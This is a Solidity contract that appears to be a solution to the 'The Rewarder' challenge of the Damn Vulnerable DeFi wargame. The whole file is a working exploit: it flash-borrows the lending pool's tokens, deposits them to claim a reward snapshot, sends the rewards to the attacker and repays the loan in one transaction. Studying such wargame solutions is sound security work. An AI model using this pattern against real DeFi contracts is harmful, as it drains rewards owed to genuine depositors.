// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IRewardToken {
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface ITheRewarderPool {
    function liquidityToken() external returns (IDamnValuableToken);

    function rewardToken() external returns (IRewardToken);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IFlashLoanReceiver {
    function receiveFlashLoan(uint256 amount) external;
}

contract TheRewarderHack is IFlashLoanReceiver {
    address immutable attacker;
    uint256 immutable TOKENS_IN_LENDER_POOL;
    IFlashLoanerPool immutable flashLoanerPool;
    ITheRewarderPool immutable rewarderPool;
    IDamnValuableToken immutable liquidityToken;
    IRewardToken immutable rewardToken;

    constructor(
        uint256 _tokensInLenderPool,
        address _flashLoanerPool,
        address _rewarderPool
    ) {
        attacker = msg.sender;
        TOKENS_IN_LENDER_POOL = _tokensInLenderPool;
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        liquidityToken = ITheRewarderPool(_rewarderPool).liquidityToken();
        rewardToken = ITheRewarderPool(_rewarderPool).rewardToken();
    }

    // Only start the exploit if TheRewarderPool's lastRecordedSnapshotTimestamp is older than 5 days!
    function attack() external {
        // Take a loan.
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL); // Triggers callback.
    }

    // The flashloan callback.
    function receiveFlashLoan(uint256 amount) external override {
        // Deposit all of the borrowed tokens.
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount); // Triggers snapshot and distribution of rewards.
        // Transfer rewards to attacker EOA.
        uint256 rewards = rewarderPool.distributeRewards(); // Doesn't have any effect but quickly gives us the amount of rewards.
        rewardToken.transfer(attacker, rewards);
        // Withdraw all of the liquidity tokens again.
        rewarderPool.withdraw(amount);
        // Pay back the flash loan.
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
